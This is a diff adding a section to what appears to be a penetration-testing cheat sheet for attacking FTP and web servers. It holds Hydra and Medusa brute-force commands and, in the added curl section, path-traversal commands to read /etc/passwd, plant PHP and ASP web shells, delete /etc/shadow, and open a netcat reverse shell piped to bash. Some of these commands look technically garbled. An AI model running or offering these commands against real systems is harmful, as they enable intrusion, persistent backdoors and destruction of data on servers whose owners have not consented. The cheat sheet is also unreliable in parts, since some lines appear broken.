@@ -28,7 +28,7 @@ medusa -h <target_ip> -U /path/to/ftp_users.txt -P /usr/share/wordlists/rockyou.
 medusa -h <target_ip> -u anonymous -p "-" -M ftp  # "-" blank pass
 ```
 
-# Hydra
+# 3. Hydra
 
 ## Brute Force
 
@@ -44,6 +44,32 @@ hydra -L ftp_users.txt -p testpass ftp://<target_ip>:PORT -t 64 -f -V  # -f ilk 
 
 # Custom module ilə (vsftpd backdoor)
 hydra -l ":)" -p any ftp://<target_ip>  # Backdoor user
+```
+
+# 4. CURL
+
+```bash
+# /etc/passwd append (user enum)
+curl -k --ftp-ssl --user "anonymous:anon" --upload-file /dev/null --path-as-is ftp://<target_ip>/../../../../../../etc/passwd
+
+# Webshell yaz (/var/www/html/shell.php)
+curl -k --ftp-ssl -u "<creds>" --upload-file shell.php --path-as-is ftp://<target_ip>/../../../../../../var/www/html/shell.php
+
+# Arbitrary file yaz (path traversal)
+curl -k -X PUT -H "Host: <target_ip>" --user "admin:pass" --data-binary "<?php system(\$_GET['c']); ?>" --path-as-is https://<target_ip>/../../../../../../../var/www/html/shell.php
+
+# Windows IIS (/inetpub/wwwroot)
+curl -k -X PUT --user "IIS_IUSRS:blank" --data-binary "<% eval request(\"cmd\") %>" --path-as-is http://<target_ip>/../..\\../inetpub/wwwroot/shell.asp
+
+# DELETE for cleanup/DoS
+curl -k -X DELETE --user "creds" --path-as-is https://<target_ip>/../../../../../../etc/shadow
+
+# Bounce scan (nmap -b alternative)
+curl --ftp-port 127.0.0.1 --user "anon:anon" --upload-file /dev/null ftp://<target_ip>
+
+# Traversal + bounce shell
+curl -k --ftp-ssl -u "ftpuser:pass" --upload-file "nc -e /bin/sh 10.0.0.1 4441" --path-as-is ftp://<target_ip>/../bounce.sh && curl ftp://<target_ip>/../bounce.sh | bash
+
 ```
 
 # FTP
